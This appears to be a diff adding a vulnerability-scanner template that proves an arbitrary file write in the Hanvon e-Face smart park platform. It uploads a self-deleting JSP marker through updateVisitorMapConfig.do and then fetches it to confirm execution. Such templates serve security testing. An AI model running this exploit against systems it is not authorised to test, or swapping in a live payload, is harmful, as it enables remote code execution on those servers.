@@ -1,0 +1,58 @@
+id: poc-yaml-hw-e-face-pass-spmp-updatevisitormapconfig-do-anyfile-write
+info:
+  name: 汉王e脸通智慧园区管理平台 updateVisitorMapConfig.do 任意文件写入漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: 文件写入
+  description: |
+    汉王e脸通智慧园区管理平台存在任意文件写入漏洞，通过特定的接口可以上传恶意文件并执行。
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+  t3: "{{base64(concat('<% out.print(\"', t2, '\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'))}}"
+flow: |
+  http(1) && http(2)
+http:
+  - id: write-file
+    method: POST
+    path:
+      - "{{BaseURL}}/manage/visitorMapConfig/updateVisitorMapConfig.do?recoToken=SGUsqvF7cVS"
+    headers:
+      Content-Type: application/json
+    body: |-
+      {
+        "id": 1,
+        "mapName": "{{t1}}",
+        "fileType": "jsp",
+        "updatedPhoto": "{{t3}}"
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"success":true'
+          - '更新成功'
+          - '.jsp'
+        part: body
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        regex:
+          - "(?P<file>[0-9a-z]{32}).jsp"
+  - id: check-file
+    method: GET
+    path:
+      - "{{BaseURL}}/manage/resource/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
